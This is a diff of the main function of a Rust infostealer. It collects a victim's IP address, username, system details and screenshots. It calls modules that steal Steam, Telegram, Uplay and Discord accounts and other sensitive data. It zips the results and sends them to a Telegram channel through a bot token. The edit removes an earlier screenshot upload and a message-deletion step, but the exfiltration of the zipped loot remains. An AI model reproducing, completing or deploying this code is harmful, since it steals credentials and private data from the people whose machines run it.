@@ -55,32 +55,11 @@ async fn main() {
 
     std::fs::create_dir(string_path).unwrap(); // Crash if we dont have permission to create the directory.
     
-    let channel = ChannelId::from(CHANNEL_ID);
     let bot = Bot::new(BOT_TOKEN.to_string());
     let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
     let mut sys = System::new_all();
     sys.refresh_all();
 
-    let message = bold((
-        format!(
-            "**Information From ({} / {} )**\n",
-            my_internet_ip::get().unwrap().to_string(),
-            whoami::lang().collect::<Vec<String>>().first().unwrap()
-        ),
-        format!("User: {}\n", whoami::username()),
-        format!("Installed Languages: {} \n", language),
-        format!(
-            "Operating System: {} {}\n",
-            sys.name().unwrap(),
-            sys.os_version().unwrap()
-        ),
-        format!(
-            "Used/Installed RAM: {} / {} GB \n",
-            sys.used_memory() / 1024 / 1024,
-            sys.total_memory() / 1024 / 1024
-        ),
-        format!("Cores available: {} \n", sys.cpus().len()),
-    ));
 
     let city = match Locator::get(&my_internet_ip::get().unwrap().to_string(), Service::IpApi).await
     {
@@ -98,27 +77,7 @@ async fn main() {
         std::fs::write(format!("{}\\screen-{}.png", string_path, i), &buffer).unwrap(); // make it with i because the library is stupid and cant do it on its own.
         i += 1;
     }
-    let _call_result = bot
-        .send_document(
-            channel,
-            Document::with_bytes(
-                "data.png",
-                &std::fs::read(format!("{}\\screen-1.png", string_path)).unwrap(),
-            )
-            .caption(ParseMode::with_markdown_v2(
-                &markdown_v2(message).to_string(),
-            )),
-        )
-        .call()
-        .await;
-        
-        if let Err(_err) = _call_result {
-        std::fs::File::create(format!("{}\\error.txt", string_path))
-        .unwrap()
-        .write_all(_err.to_string().as_bytes())
-        .unwrap();
-        std::process::exit(0);
-    }
+   
 
     let mut sysinfo = vec![];
     sysinfo.push(format!("Username: {}", whoami::username()));
@@ -183,7 +142,6 @@ async fn main() {
     other_grabber::sensitive_data::grab_data();
     other_grabber::steam::steal_steam_account();
     other_grabber::telegram::steal_telegram();
-    other_grabber::sensitive_data::grab_data();
     other_grabber::uplay::steal_uplay();
 
     messengers::discord::steal_discord();
@@ -242,14 +200,7 @@ async fn main() {
         log_accounts.read_to_end(&mut log_buffer).unwrap();
         let _data_document: Document = Document::with_bytes("out.zip", &log_buffer);
 
-        let _ = bot
-            .delete_message(
-                ChannelId::from(CHANNEL_ID),
-                _call_result.as_ref().unwrap().id,
-            )
-            .call()
-            .await;
-
+   
         let _call_result = bot
             .send_document(
                 ChannelId::from(CHANNEL_ID),
